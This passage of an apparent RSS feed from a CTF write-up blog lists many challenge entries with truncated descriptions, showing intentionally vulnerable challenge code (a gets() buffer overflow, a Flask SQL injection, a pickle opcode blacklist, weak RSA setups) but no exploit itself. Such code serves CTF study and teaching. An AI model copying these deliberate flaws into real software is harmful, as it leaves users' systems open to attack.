import secrets from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import sha256 from flag import FLAG def getCRC16(msg, gen_poly): assert (1 &amp;lt;&amp;lt; 16) &amp;lt;= gen_poly &amp;lt; (1 &amp;lt;&amp;lt; 17) # check if deg = 16 msglen = msg.bit_length() msg &amp;lt;&amp;lt;= 16 for i in range(msglen - 1, -1, -1): if (msg &amp;gt;&amp;gt; (i + 16)) &amp;amp; 1: msg ^= (gen_poly &amp;lt;&amp;lt; i) return msg def oracle(secret, gen_poly): res = [secrets.</description></item><item><title>Noleak</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/noleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/noleak/</guid><description>We are provided a 64-bit binary called noleak:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering Its decompiled C source code is pretty simple:
undefined8 _() { undefined8 unaff_RBP; return unaff_RBP; } void FUN_00401060(FILE *param_1, char *param_2, int param_3, size_t param_4) { setvbuf(param_1, param_2, param_3, param_4); } undefined8 vuln() { undefined8 param_10; undefined8 local_12; undefined2 local_a; local_12 = 0; local_a = 0; gets((char *) &amp;amp;local_12); return param_10; } undefined8 main(undefined8 param_1, undefined8 param_2, undefined8 param_3, undefined8 param_4, undefined8 param_5, undefined8 param_6) { FUN_00401060(stdin, 0, 2, 0, param_5, param_6, param_2); FUN_00401060(stdout, 0, 2, 0); FUN_00401060(stderr, 0, 2, 0); vuln(); return 0; } Basically, we have a program that uses gets in a 10-byte buffer (&amp;quot;undefined8 + undefined2&amp;quot;).</description></item><item><title>not crypto</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/not-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/not-crypto/</guid><description>This is the not crypto flag which is totaly not crypto, but crypto! Can we get a clap from the team for excessive crypto usage?
We are given the following Python script:
import base64 input_string = "REMOVED" def secret(raw_string): result = [] for char in raw_string: if 'a' &amp;lt;= char &amp;lt;= 'z': offset = ord('a') result.append(chr(((ord(char) - offset + 13) % 26) + offset)) elif 'A' &amp;lt;= char &amp;lt;= 'Z': offset = ord('A') result.</description></item><item><title>Notepad as a Service</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/notepad-as-a-service/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/notepad-as-a-service/</guid><description>We are given a 64-bit binary called notepad:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) If we use Ghidra to extract the decompiled C source code, we see the main function:
void main() { setbuf(stdout, (char *) 0x0); do { notepad(); } while (true); } Basically, it runs notepad infinitely:
void notepad() { long in_FS_OFFSET; char option; int i; undefined notes[136]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); for (i = 0; i &amp;lt; 128; i = i + 1) { notes[i] = 0; } puts("</description></item><item><title>Nowhere to go</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/</guid><description>We are given compressed filesystem, a kernel image and a qemu script:
# file * bzImage: Linux kernel x86 boot executable bzImage, version 5.9.16 (buildroot@a7f111e5c8c1) #1 SMP Thu Apr 22 11:04:47 UTC 2021, RO-rootFS, swap_dev 0X8, Normal VGA rootfs.cpio.gz: gzip compressed data, max compression, from Unix, original size modulo 2^32 5115392 run.sh: Bourne-Again shell script, ASCII text executable #!/bin/bash qemu-system-x86_64 \ -m 128M \ -cpu qemu64 \ -nographic \ -monitor /dev/null \ -kernel .</description></item><item><title>Nuclear Sale</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/nuclear-sale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/nuclear-sale/</guid><description>We are given a PCAP file (challenge.pcap). If we analyze it using Wireshark, we will see some SMTP emails:
The challenge is based on a series of emails sent within a company. There is some information encrypted there. These are the emails:
Hello everyone, A potential Buyer approached us asking for a HUGE amount of plutonium. Are we even allowed to sell this much? Best Regards, Sales Dept We are very XORry but the management does not approve such a sale.</description></item><item><title>Obedient Cat</title><link>https://7rocky.github.io/en/ctf/picoctf/general-skills/obedient-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/general-skills/obedient-cat/</guid><description>We are given a file. The flag is contained inside the file:
$ cat flag picoCTF{s4n1ty_v3r1f13d_28e8376d}</description></item><item><title>Old Bridge</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/</guid><description>We are given a 64-bit binary called oldbridge:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled We have almost all protetions enabled, so we must perform several bypasses to exploit the binary.
Reverse engineering As in most binary exploitation challenges, we must do a reverse engineering step to obtain the assembly instructions or the C source code of the binary to determine what it is doing and how we can exploit it.</description></item><item><title>One Step Closer</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/one-step-closer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/one-step-closer/</guid><description>We are given a Python code to encrypt the flag, and a Flask application that calls the encryption function:
from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime, inverse import random FLAG = b'HTB{--REDACTED--}' p = getPrime(1024) q = getPrime(1024) n = p * q e = 257 def encrypt_flag(): a = random.getrandbits(1024) b = random.getrandbits(1024) flag = bytes_to_long(FLAG) msg = a*flag + b ct = pow(msg, e, n) return {'ct': format(ct, 'x'), 'n': format(n, 'x'), 'e': format(e, 'x'), 'a': format(a, 'x'), 'b': format(b, 'x')} from flask import * from chall import encrypt_flag app = Flask(__name__) @app.</description></item><item><title>Optimistic</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/optimistic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/optimistic/</guid><description>We are given a 64-bit binary called optimistic:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Reverse engineering If we use Ghidra, we will see the decompiled source code in C for the main function:
void main() { int number; ssize_t read_length; uint length; undefined4 local_80; undefined2 local_7c; char option; undefined local_79; undefined email[8]; undefined age[8]; char name[96]; initialize(); puts("</description></item><item><title>Optimus Prime</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/optimus-prime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/optimus-prime/</guid><description>We are given a remote instance to connect to. There are some options:
$ nc 167.99.202.193 31899 Your people must learn to be masters of their own fate. 1. View status of the Transformer. 2. View Serial ID's of the Transformer. 3. Register new Transformer. 4. Enter to the access panel. Enter the option: 1 Battery: 60% Mechanical damages: 14% Heat: 64.76 ºC Ncat: Broken pipe. $ nc 167.99.202.193 31899 Your volume, like any capability, is also a responsibility.</description></item><item><title>Oracle</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/</guid><description>We are given a 64-bit binary called oracle:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled We also have a Dockerfile:
FROM ubuntu:20.04 RUN useradd -m ctf COPY challenge/* /home/ctf/ RUN chown -R ctf:ctf /home/ctf/ WORKDIR /home/ctf USER ctf EXPOSE 9001 CMD ["./run.sh"] Source code analysis This time, we are given the source code of the program in C. It is quite large, so I will only put the relevant parts.</description></item><item><title>Oracle Leaks</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/oracle-leaks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/oracle-leaks/</guid><description>We are given the Python source code of the server:
import os import math from Crypto.Util.number import * from cryptography.hazmat.primitives.asymmetric import rsa def get_length(pt): res = 0 if (len(bin(pt)) - 2) % 8 != 0: res += 1 res += (len(bin(pt)) - 2) // 8 return res def ceil(a, b): return -(-a // b) class RSA: def __init__(self, size): self.e = 0x10001 self.size = size priv = rsa.generate_private_key( public_exponent=self.e, key_size=size ) pub = priv.</description></item><item><title>Orbital</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/orbital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/orbital/</guid><description>We are given a website like this:
We also have the source code in Python.
Source code analysis The web application is built with Flask. A clear SQL injection (SQLi) vulnerability can be found at database.py:
from colorama import Cursor from application.util import createJWT, passwordVerify from flask_mysqldb import MySQL mysql = MySQL() def query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.</description></item><item><title>Orbital</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/orbital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/orbital/</guid><description>We are given a website like this:
We also have the source code in Python.
Source code analysis The web application is built with Flask. A clear SQL injection (SQLi) vulnerability can be found at database.py:
from colorama import Cursor from application.util import createJWT, passwordVerify from flask_mysqldb import MySQL mysql = MySQL() def query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.</description></item><item><title>Ouija</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ouija/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ouija/</guid><description>We are given a binary file called ouija:
$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=53a9e0435f7c7041c557e9d4a8418cb6a916f339, for GNU/Linux 3.2.0, not stripped Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:
int main() { undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined4 local_60; undefined2 local_5c; undefined local_5a; int key_copy; int r; int m; int o; int n; int q; int p; int l; char *enc_flag; int k; int j; int i; local_78 = 0x6877644b7b544c5a; local_70 = 0x665f6b615f796661; local_68 = 0x6b6d7874675f6c67; local_60 = 0x616c7375; local_5c = 0x6667; local_5a = 0x7d; setvbuf(stdout, NULL, 2, 0); enc_flag = strdup((char *) &amp;amp;local_78); puts("</description></item><item><title>Ouija</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/ouija/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/ouija/</guid><description>We are given a binary file called ouija:
$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2cace162c306a34dcfc4837d648d047e2ea339fe, for GNU/Linux 3.2.0, not stripped Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:
int main() { int key_copy; int r; int m; int o; int n; int q; int p; int l; char *enc_flag; int k; int j; int i; setvbuf(stdout, NULL, 2, 0); enc_flag = strdup("</description></item><item><title>Oxidized ROP</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/</guid><description>We have a 64-bit binary called oxidized-rop:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Moreover, we have the source code in Rust, so no need to reverse-engineer the binary.
Source code analysis This is main:
fn main() { print_banner(); let mut feedback = Feedback { statement: [0_u8; INPUT_SIZE], submitted: false, }; let mut login_pin: u32 = 0x11223344; loop { print_menu(); match get_option().expect("Invalid Option"</description></item><item><title>Packet Cyclone</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/packet-cyclone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/packet-cyclone/</guid><description>We have this description for the challenge:
Pandora&amp;rsquo;s friend and partner, Wade, is the one that leads the investigation into the relic&amp;rsquo;s location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade&amp;rsquo;s research to the cloud.</description></item><item><title>Pandora's Bane</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-bane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-bane/</guid><description>We are given a large memory dump called mem.raw:
$ du -h mem.raw 2,1G	mem.raw $ file mem.raw mem.raw: data Memory dump analysis Let&amp;rsquo;s use volatility to analyze it (I will use a Docker image for that):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/sh --platform linux/amd64 -it sk4la/volatility3 /usr/local $ cd /project /project $ vol -f mem.raw windows.info.Info | tee info.txt Volatility 3 Framework 2.0.1 Progress: 100.00	PDB scanning finished Variable	Value Kernel Base	0xf80445604000 DTB	0x1ad000 Symbols	file:///usr/local/lib/volatility3/volatility3/symbols/windows/ntkrnlmp.</description></item><item><title>Pandora's Box</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-box/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-box/</guid><description>We are given a 64-bit binary called pb:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering We can use Ghidra to analyze the binary and look at the decompiled source code in C:
int main() { setup(); cls(); banner(); box(); return 0; } Among others, this function calls box:
void box() { long num; char data [32]; data._0_8_ = 0; data.</description></item><item><title>Paranormial Commitment Scheme</title><link>https://7rocky.github.io/en/ctf/other/plaid-ctf/paranormial-commitment-scheme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/plaid-ctf/paranormial-commitment-scheme/</guid><description>We are given the Rust source code of the project that is used to encrypt the flag.
This is the main file (src/bin/paranormial.rs):
use pairing_ce::{ bls12_381::{Fr, G1Affine}, ff::{Field, PrimeField}, CurveAffine, GenericCurveProjective, }; use paranormial::{Polynomial, Setup}; use primitive_types::U256; use rand::{OsRng, Rng}; use std::{ fs::File, io::Read, }; const DEGREE: usize = 256; const ALPHA: &amp;amp;str = "1337133713371337133713371337133713371337133713371337133713371337133713371337"; const NUM_POINTS: usize = 512; const PARANOMIAL_RATE: u32 = 3; fn main() { let setup_path = std::env::args().</description></item><item><title>Partial Tenacity</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/partial-tenacity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/partial-tenacity/</guid><description>We are given the Python source code that encrypts the flag:
from secret import FLAG from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP class RSACipher: def __init__(self, bits): self.key = RSA.generate(bits) self.cipher = PKCS1_OAEP.new(self.key) def encrypt(self, m): return self.cipher.encrypt(m) def decrypt(self, c): return self.cipher.decrypt(c) cipher = RSACipher(1024) enc_flag = cipher.encrypt(FLAG) with open('output.txt', 'w') as f: f.write(f'n = {cipher.key.n}\n') f.write(f'ct = {enc_flag.hex()}\n') f.write(f'p = {str(cipher.key.p)[::2]}\n') f.write(f'q = {str(cipher.key.q)[1::2]}') We also have the output of the script:</description></item><item><title>Passman</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/passman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/passman/</guid><description>We are given a website like this:
We also have the source code in Node.js.
Source code analysis The web application is built with Express JS. A relevant file is routes/index.js:
const express = require('express'); const router = express.Router(); const { graphqlHTTP } = require('express-graphql'); const AuthMiddleware = require('../middleware/AuthMiddleware'); const GraphqlSchema = require('../helpers/GraphqlHelper'); router.get('/', (req, res) =&amp;gt; { return res.render('login.html'); }); router.get('/register', (req, res) =&amp;gt; { return res.render('register.html'); }); router.use('/graphql', AuthMiddleware, graphqlHTTP({ schema: GraphqlSchema, graphiql: false })); router.</description></item><item><title>Passman</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/passman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/passman/</guid><description>We are given a website like this:
We also have the source code in Node.js.
Source code analysis The web application is built with Express JS. A relevant file is routes/index.js:
const express = require('express'); const router = express.Router(); const { graphqlHTTP } = require('express-graphql'); const AuthMiddleware = require('../middleware/AuthMiddleware'); const GraphqlSchema = require('../helpers/GraphqlHelper'); router.get('/', (req, res) =&amp;gt; { return res.render('login.html'); }); router.get('/register', (req, res) =&amp;gt; { return res.render('register.html'); }); router.use('/graphql', AuthMiddleware, graphqlHTTP({ schema: GraphqlSchema, graphiql: false })); router.</description></item><item><title>Path of Survival</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/path-of-survival/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/path-of-survival/</guid><description>We are given the following website:
It shows a kind of labyrinth where we are an astronaut and we need to find a weapon in the shortest time possible.
The website shows how to interact with our astronaut player, and shows some rules regarding labyrinth tiles (Cliff, Geyser, Mountain&amp;hellip;):
Moreover, we have an HTTP API to get the map as a JSON document and to run commands to move the astronaut:</description></item><item><title>Peel Back The Layers</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/peel-back-the-layers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/peel-back-the-layers/</guid><description>We have this description for the challenge:
A well known hacker rival of ours, managed to gain access to our dockehub profile and insert a backdoor to one of our public docker images in order to distribute his malware and fullfil his soul purpose, which is to destroy our steampunk robot using his steam malware. When we started tracing him back he deleted his backdoor. Can you help us retrieve his backdoor?</description></item><item><title>Percetron</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/</guid><description>We are given a website where we can register and log in to have this dashboard:
Moreover, we are given the whole web project for analysis.
Source code analysis The web server is running Express JS (Node.js). The index.js file is quite standard, but we can see that it uses MongoDB and neo4j:
require("dotenv").config(); const path = require("path"); const express = require("express"); const session = require("express-session"); const mongoose = require("mongoose"); const Neo4jConnection = require("</description></item><item><title>Perfect Synchronization</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/perfect-synchronization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/perfect-synchronization/</guid><description>We are given the Python source code to encrypt the flag:
from os import urandom from Crypto.Cipher import AES from secret import MESSAGE assert all([x.isupper() or x in '{_} ' for x in MESSAGE]) class Cipher: def __init__(self): self.salt = urandom(15) key = urandom(16) self.cipher = AES.new(key, AES.MODE_ECB) def encrypt(self, message): return [self.cipher.encrypt(c.encode() + self.salt) for c in message] def main(): cipher = Cipher() encrypted = cipher.encrypt(MESSAGE) encrypted = "\n".join([c.hex() for c in encrypted]) with open("</description></item><item><title>Personalized</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/personalized/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/personalized/</guid><description>We are given the Python source code used to encrypt the flag:
#!/usr/bin/env python3 from Crypto.Util.number import * from random import seed, getrandbits m = bytes_to_long(open('flag.txt', 'rb').read()) print("What's your name?\n&amp;gt;&amp;gt;&amp;gt; ", end='') name = open(0, 'rb').readline().strip() seed(bytes_to_long(name)) e = 2*getrandbits(32)+1 p = getPrime(512) q = getPrime(512) n = p*q c = pow(m, e, n) print(f"Here's your flag, {''.join(chr(i) for i in name)}!") print(f'{n = }') print(f'{e = }') print(f'{c = }') It uses a RSA implementation where we can provide a name that will be used as the seed for a Pseudo-Random Number Generator (PRNG).</description></item><item><title>Pickle</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/pickle/</guid><description>We are given a file called out.pickle. The flag is stored inside, we can visualize its contents in hexadecimal:
$ xxd out.pickle 00000000: 8004 958c 0000 0000 0000 008c 085f 5f6d .............__m 00000010: 6169 6e5f 5f94 8c0b 466c 6167 5072 696e ain__...FlagPrin 00000020: 7465 7294 9394 2981 947d 9428 8c04 666c ter...)..}.(..fl 00000030: 6167 945d 9428 4b69 4b63 4b74 4b66 4b7b ag.].(KiKcKtKfK{ 00000040: 4b63 4b75 4b63 4b75 4b6d 4b62 4b65 4b72 KcKuKcKuKmKbKeKr 00000050: 4b73 4b5f 4b6f 4b72 4b5f 4b70 4b69 4b63 KsK_KoKrK_KpKiKc 00000060: 4b6b 4b6c 4b65 4b73 4b3f 4b7d 658c 0466 KkKlKeKsK?</description></item><item><title>Pickle Panic</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/pickle-panic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/pickle-panic/</guid><description>We are given this Python script that is executed in the remote instance:
#!/usr/bin/env python3 import pickle import pickletools import io import sys BLACKLIST_OPCODES = { "BUILD", "SETITEM", "SETITEMS", "DICT", "EMPTY_DICT", "INST", "OBJ", "NEWOBJ", "EXT1", "EXT2", "EXT4", "EMPTY_SET", "ADDITEMS", "FROZENSET", "NEWOBJ_EX", "FRAME", "BYTEARRAY8", "NEXT_BUFFER", "READONLY_BUFFER", } module = type(__builtins__) empty = module("empty") sys.modules["empty"] = empty class MyUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == "empty" and name.count(".") &amp;lt;= 1 and "</description></item><item><title>PICtureThis</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/picturethis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/picturethis/</guid><description>In this challenge they give us a Windows PE called main.exe and an encrypted DLL (ciphered.dll):
$ file * ciphered.dll: data main.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows Analyzing main.exe At the moment, we can start by opening main.exe in Ghidra and look at the strings. We quickly see one that indicates how the program has to be executed main.exe:
Funcionamiento: ./reto.exe &amp;lt;input_string&amp;gt; If we look for references to this string, we will reach the main function:</description></item><item><title>PIN</title><link>https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/pin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/pin/</guid><description>We are given a binary called rev1:
$ file rev1 rev1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5f9af621b132c2028d8e689cbb5b707f3f3cd28, not stripped If we run it, the program expects for a PIN:
$ ./rev1 Masukan PIN = 1234 PIN salah ! Let&amp;rsquo;s debug it with GDB and disassemble main:
$ gdb -q rev1 Reading symbols from rev1... (No debugging symbols found in rev1) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004005d6 &amp;lt;+0&amp;gt;: push rbp 0x00000000004005d7 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x00000000004005da &amp;lt;+4&amp;gt;: sub rsp,0x10 0x00000000004005de &amp;lt;+8&amp;gt;: lea rdi,[rip+0xdf] # 0x4006c4 0x00000000004005e5 &amp;lt;+15&amp;gt;: mov eax,0x0 0x00000000004005ea &amp;lt;+20&amp;gt;: call 0x4004a0 &amp;lt;printf@plt&amp;gt; 0x00000000004005ef &amp;lt;+25&amp;gt;: lea rax,[rbp-0x4] 0x00000000004005f3 &amp;lt;+29&amp;gt;: mov rsi,rax 0x00000000004005f6 &amp;lt;+32&amp;gt;: lea rdi,[rip+0xd6] # 0x4006d3 0x00000000004005fd &amp;lt;+39&amp;gt;: mov eax,0x0 0x0000000000400602 &amp;lt;+44&amp;gt;: call 0x4004b0 &amp;lt;__isoc99_scanf@plt&amp;gt; 0x0000000000400607 &amp;lt;+49&amp;gt;: mov eax,DWORD PTR [rbp-0x4] 0x000000000040060a &amp;lt;+52&amp;gt;: mov edi,eax 0x000000000040060c &amp;lt;+54&amp;gt;: call 0x4005b6 &amp;lt;cek&amp;gt; 0x0000000000400611 &amp;lt;+59&amp;gt;: test eax,eax 0x0000000000400613 &amp;lt;+61&amp;gt;: je 0x400623 &amp;lt;main+77&amp;gt; 0x0000000000400615 &amp;lt;+63&amp;gt;: lea rdi,[rip+0xba] # 0x4006d6 0x000000000040061c &amp;lt;+70&amp;gt;: call 0x400490 &amp;lt;puts@plt&amp;gt; 0x0000000000400621 &amp;lt;+75&amp;gt;: jmp 0x40062f &amp;lt;main+89&amp;gt; 0x0000000000400623 &amp;lt;+77&amp;gt;: lea rdi,[rip+0xba] # 0x4006e4 0x000000000040062a &amp;lt;+84&amp;gt;: call 0x400490 &amp;lt;puts@plt&amp;gt; 0x000000000040062f &amp;lt;+89&amp;gt;: mov eax,0x0 0x0000000000400634 &amp;lt;+94&amp;gt;: leave 0x0000000000400635 &amp;lt;+95&amp;gt;: ret End of assembler dump.</description></item><item><title>Pinned</title><link>https://7rocky.github.io/en/ctf/htb-challenges/mobile/pinned/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/mobile/pinned/</guid><description>We are given an APK file (pinned.apk) and a README.txt file:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google APIs)). Dynamic analysis Let&amp;rsquo;s start MobSF and Genymotion to do a dynamic analysis:
It simply shows a login form with the credentials already written. I was not able to read the password from there. If we click the button, we will see a successful message:</description></item><item><title>plai_n_rsa</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/plai_n_rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/plai_n_rsa/</guid><description>We are given the Python source code to encrypt the flag:
import os from Crypto.Util.number import bytes_to_long, getPrime flag = os.getenvb(b"FLAG", b"SECCON{THIS_IS_FAKE}") assert flag.startswith(b"SECCON{") m = bytes_to_long(flag) e = 0x10001 p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 phi = (p-1)*(q-1) d = pow(e, -1, phi) hint = p+q c = pow(m,e,n) print(f"e={e}") print(f"d={d}") print(f"hint={hint}") print(f"c={c}") And the output of the script:
e=65537 d=15353693384417089838724462548624665131984541847837698089157240133474013117762978616666693401860905655963327632448623455383380954863892476195097282728814827543900228088193570410336161860174277615946002137912428944732371746227020712674976297289176836843640091584337495338101474604288961147324379580088173382908779460843227208627086880126290639711592345543346940221730622306467346257744243136122427524303881976859137700891744052274657401050973668524557242083584193692826433940069148960314888969312277717419260452255851900683129483765765679159138030020213831221144899328188412603141096814132194067023700444075607645059793 hint=275283221549738046345918168846641811313380618998221352140350570432714307281165805636851656302966169945585002477544100664479545771828799856955454062819317543203364336967894150765237798162853443692451109345096413650403488959887587524671632723079836454946011490118632739774018505384238035279207770245283729785148 c=8886475661097818039066941589615421186081120873494216719709365309402150643930242604194319283606485508450705024002429584410440203415990175581398430415621156767275792997271367757163480361466096219943197979148150607711332505026324163525477415452796059295609690271141521528116799770835194738989305897474856228866459232100638048610347607923061496926398910241473920007677045790186229028825033878826280815810993961703594770572708574523213733640930273501406675234173813473008872562157659306181281292203417508382016007143058555525203094236927290804729068748715105735023514403359232769760857994195163746288848235503985114734813 The server uses RSA to encrypt the flag.</description></item><item><title>PolyLCG</title><link>https://7rocky.github.io/en/ctf/other/securinets-ctf/polylcg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/securinets-ctf/polylcg/</guid><description>We are given the Python source code to encrypt the flag:
